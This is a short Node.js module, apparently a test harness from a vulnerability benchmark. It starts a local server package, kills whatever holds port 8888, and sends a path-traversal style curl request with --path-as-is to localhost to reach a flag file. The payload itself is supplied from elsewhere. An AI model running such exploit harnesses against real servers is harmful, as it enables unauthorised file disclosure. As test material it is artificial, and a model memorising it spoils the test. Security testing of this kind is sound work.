function exploitFunction(getPayload) {
  const { exec } = require("child_process");
  const { sleep } = require("sleep");

  // Stop any running server on port 8888
  try {
    exec("fuser -k 8888/tcp", (error) => {});
  } catch (e) {}

  const pathToFlag = path.resolve(__dirname, "../flag.html");
  const server = "node ./node_modules/cypserver/index.js";

  // Start the server
  exec(server, (error, stdout) => {
    sleep.sleep(2);

    // Generate the attack string
    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${getPayload()}"`;

    // Execute the attack
    exec(attack_string, (error, stdout) => {
      if (error) {
        console.error(`Error executing attack: ${error}`);
      } else {
        console.log(`Attack output: ${stdout}`);
      }
    });
  });
}

module.exports = { exploitFunction };